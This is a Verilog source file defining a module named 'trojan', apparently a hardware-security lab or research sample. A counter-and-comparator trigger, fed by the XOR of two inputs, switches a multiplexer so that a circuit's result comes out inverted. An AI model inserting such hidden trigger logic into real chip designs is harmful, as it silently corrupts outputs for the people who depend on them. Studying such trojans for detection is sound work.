`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    19:45:25 11/16/2017 
// Design Name: 
// Module Name:    trojan 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module trojan(
	input original_result,
	input a,
	input b,
	input clk,
	input reset,
	output modified_result
    );

wire mux_in, up_down, select_line;
wire [127:0]count;

not not1(mux_in,original_result);
xor xor1(up_down,a,b);

up_down_counter counter1(count,up_down,clk,reset);
comparator comparator1(select_line,count);

mux2_1 mux1(modified_result,original_result,mux_in,select_line);


endmodule
